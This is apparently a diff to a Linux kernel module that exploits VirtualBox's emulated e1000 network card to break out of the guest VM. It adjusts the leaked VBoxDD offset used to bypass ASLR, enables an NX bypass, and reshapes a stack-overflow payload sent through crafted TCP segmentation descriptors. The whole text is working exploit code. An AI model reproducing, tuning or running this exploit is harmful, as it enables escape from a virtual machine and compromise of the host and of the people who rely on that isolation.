@@ -21,7 +21,7 @@ MODULE_SUPPORTED_DEVICE("none");
 MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
-#define LEAKED_VBOXDD_VAO 0x331000
+#define LEAKED_VBOXDD_VAO 0x20E600
 
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
@@ -63,7 +63,7 @@ static int __init e1k_init(void)
 	e1k_configure();	
 	aslr_bypass();
 
-	//nx_bypass();
+	nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -346,7 +346,7 @@ static uint64_t aslr_bypass(void)
 
 	disable_loopback();
 	for (i = 0; i < 8; i++) {
-		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
+		write_primitive(0x201f, 0x0058 + 0x2A + 0x8 + i);
 		leaked_bytes[i] = inb(0x4107);
 	}
 
@@ -373,10 +373,14 @@ static void stack_overflow(void)
 	//------------- Payload setup -------------//
 
 	// Payload setup
-	for (i = 0; i < (0x3F90); ++i) {
+	// Need to be clean
+	for (i = 0; i < 0x3F90; ++i) {
 		tx_buffer[i] = 0x61; // Fill with garbage "a"
 	}
-	for (i = 0x3F98; i < (0x4010); ++i) {
+	for (i = 0x3F90; i < 0x3F98; ++i) {
+		tx_buffer[i] = 0x00; // Fill with usefull "0"
+	}
+	for (i = 0x3F98; i < 0x4000; ++i) {
 		tx_buffer[i] = 0x61; // Fill with garbage "a"
 	}
 	//tx_buffer[PAYLOAD_LEN - 164]	= 0x20;
@@ -404,11 +408,11 @@ static void stack_overflow(void)
 	
 	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
 	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
-	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | 0x4010);
+	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | 0x4000);
 	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 	
 	data_5->buffer_addr				= (uint64_t) physical_address;
-	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | 0x4010 | TSE);
+	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | 0x4000 | TSE);
 	data_5->upper.data				= (uint32_t) 0;
 	//-----------------------------------------//
 
